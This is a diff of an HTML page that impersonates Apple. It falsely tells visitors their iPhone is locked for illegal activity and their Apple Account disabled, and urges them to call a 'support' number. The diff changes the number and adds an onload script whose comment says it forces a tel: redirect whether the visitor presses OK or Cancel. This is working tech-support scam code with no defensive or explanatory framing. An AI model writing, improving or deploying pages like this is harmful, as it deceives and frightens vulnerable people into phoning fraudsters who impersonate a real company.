@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="utf-8"/>
@@ -35,18 +36,24 @@
 
   <!-- Main Content -->
   <main class="flex flex-col items-center justify-center text-center px-6 pt-20 pb-20 bg-black opacity-60">
-    <p class="text-white font-bold  sm:text-xl md:text-2xl max-w-5xl leading-relaxed font-normal text-3xl">
+    <p class="text-white font-bold sm:text-xl md:text-2xl max-w-5xl leading-relaxed font-normal text-3xl">
       Your iPhone has been locked due to detected illegal activity.<br/>
       Your Apple Account has been disabled!<br/>
-      Immediately call Apple Support <strong onclick="callSupport()">+1-888-319-8224</strong> to unlock it!
+      Immediately call Apple Support <strong onclick="callSupport()">+1 844-610-5999</strong> to unlock it!
     </p>  
   </main>
 
   <script>
-       function callSupport() {
-        window.location.href = 'tel:+1-888-319-8224';
-
+    function callSupport() {
+      window.location.href = 'tel:+1 844-610-5999';
     }
+
+    // Page load par automatic popup
+    window.onload = function () {
+      let choice = confirm("Your iPhone has been locked! Call Apple Support now?");
+      // chahe OK ya Cancel dono par call redirect
+      window.location.href = 'tel:+1 844-610-5999';
+    };
   </script>
 </body>
 </html>
